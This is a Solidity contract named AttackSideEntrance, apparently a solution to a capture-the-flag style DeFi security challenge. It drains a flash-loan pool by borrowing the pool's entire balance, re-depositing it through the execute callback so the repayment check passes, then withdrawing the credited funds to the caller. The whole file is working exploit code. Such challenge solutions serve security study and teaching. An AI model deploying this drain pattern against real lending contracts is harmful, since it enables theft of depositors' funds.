// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

// interface IFlashLoanEtherReceiver {
//     function execute() external payable;
// }

contract AttackSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool immutable pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();

        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");

        require(success, "something wrong");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    fallback() external payable {}
}
